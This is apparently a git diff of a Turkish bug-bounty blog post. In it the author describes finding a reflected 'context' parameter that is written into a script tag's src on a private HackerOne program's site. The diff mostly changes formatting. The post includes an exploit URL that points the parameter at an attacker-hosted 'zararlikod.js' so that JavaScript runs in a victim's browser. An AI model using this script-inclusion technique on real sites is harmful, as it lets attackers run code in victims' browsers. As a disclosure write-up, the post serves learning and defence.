@@ -18,16 +18,18 @@ excerpt: 'Javascript File Inclusion (XSS) via a Simple Link Injection'
 
 Merhaba arkadaşlar, ben Samet ŞAHİN.
 
-HackerOne (https://hackerone.com/) üzerindeki bir gizli (private) programa **Recognize** yaparken HTTP servisini kullanan bir IP adresi buldum. Bulduğum IP adresine girince direkt olarak bir index sayfasına yönlendiriyordu. Bu index sayfasının kaynak kodlarını (CTRL-U) okurken GET yöntemiyle değer alan bir `<form>` etiketi gördüm ve içerdiği `<input>` etiketlerinden "context" parametresinden değer aldığını fark ettim. 
-<img src="/images/LinkInjectionBlogPost.PNG">
+HackerOne (https://hackerone.com/) üzerindeki bir gizli (private) programa **Recognize** yaparken HTTP servisini kullanan bir IP adresi buldum. Bulduğum IP adresine girince direkt olarak bir index sayfasına yönlendiriyordu. Bu index sayfasının kaynak kodlarını (CTRL-U) okurken GET yöntemiyle değer alan bir `<form>` etiketi gördüm ve içerdiği `<input>` etiketlerinden "context" parametresinden değer aldığını fark ettim.  
+
+<img src="/images/LinkInjectionBlogPost.PNG">  
 
 Sıradan bir XSS araştırmasında tüm girdilere (input) XSS saldırı kodları (payload) girmeyi elbette deneyebilirsiniz. Evet XSS böyle de bulunur AMA kaynak kodunu okumayıp, fonksiyonların nasıl çalıştığını ve ne işe yaradığını anlamadan **hacking** denediğiniz anda otomatize araçlardan pek de bir farkınız kalmayacaktır. Fonksiyonların nasıl çalıştığını ve ne işe yaradığını anlamak da Bug Bounty alanında iyi çalışmalar yapan kişilerden aldığım önerilerden biridir. 
 
 Yani buradan bir #bugbountytip çıkarak olursak : "Sitenin ne işe yaradığını sorgula ve nasıl bozarım diye düşün."
 
 Ufak bir trickten sonra açığımıza geri dönelim. Kaynak kodunu okumuş ve "context" isimli bir girdi etiketinin varlığını anlamıştık. Şimdi eğer daha önce çok eski sitelere **Recognize** veya **Hacking** uyguladıysanız sitenin gerçekten çalışıp çalışmadığını kontrol etmelisiniz. Hadi gelin kontrol edelim. Link'in sonunda `?context=sametsahin` yazıyorum ve kaynak koduna nerelere ve nasıl yansıdığını inceliyorum.
-> URL : https://127.0.0.1/blablabla/index.html?context=sametsahin
-<img src="/images/LinkInjectionBlogPost2.png">
+> URL : https://127.0.0.1/blablabla/index.html?context=sametsahin  
+
+<img src="/images/LinkInjectionBlogPost2.png">  
 
 Yukarıdaki URL adresini ziyaret ediyoruz ve CTRL-U kombinasyonuyla kaynak koduna giriyoruz. Ardından da CTRL-F ile "sametsahin" değerini aratıyoruz. Gördüğümüz kadarıyla "sametsahin" değeri tam 63 farklı yerde ve farklı şekillerde yansımış. Birazdan bu farklı yansıma şekillerinden bir tanesini kullanarak "Medium 6.3" değerinde bir Cross Site Scripting (XSS) açığı elde edeceğiz. 
 
@@ -39,11 +41,15 @@ Yukarıdaki resimde HTML ve JavaScript için hayati önem arz eden `<script>` et
 > Eğer benden aldığı değeri direkt olarak `<script>` etiketinin içine yerleştiriyor ise ben bu değeri bir kontrolümdeki site adresiyle değiştirip o sitedeki /javascript.js dosyasının içeriğini zararlı kodlar (payload) ile doldurarak XSS açığına erişebilirim.
 
 Bu durumda XSS açığına sebep olan URL adresimiz şu şekilde gözükecektir.
-> URL : https://127.0.0.1/blablabla/index.html?context=https://sametsahin.net/zararlikod.js?
-<img src="/images/LinkInjectionBlogPost3.png">
+> URL : https://127.0.0.1/blablabla/index.html?context=https://sametsahin.net/zararlikod.js?  
 
-Ve URL adresine kullanıcıya tıklattırdığımda kullanıcı tarayıcısında zararlı kodumuz (XSS Payloadımız) çalışacaktır.
-<img src="/images/LinkInjectionBlogPost4.png">
+<img src="/images/LinkInjectionBlogPost3.png">  
+
+
+Ve URL adresine kullanıcıya tıklattırdığımda kullanıcı tarayıcısında zararlı kodumuz (XSS Payloadımız) çalışacaktır.  
+
+<img src="/images/LinkInjectionBlogPost4.png">  
+
 
 
 **Peki neler yaptık ?**  
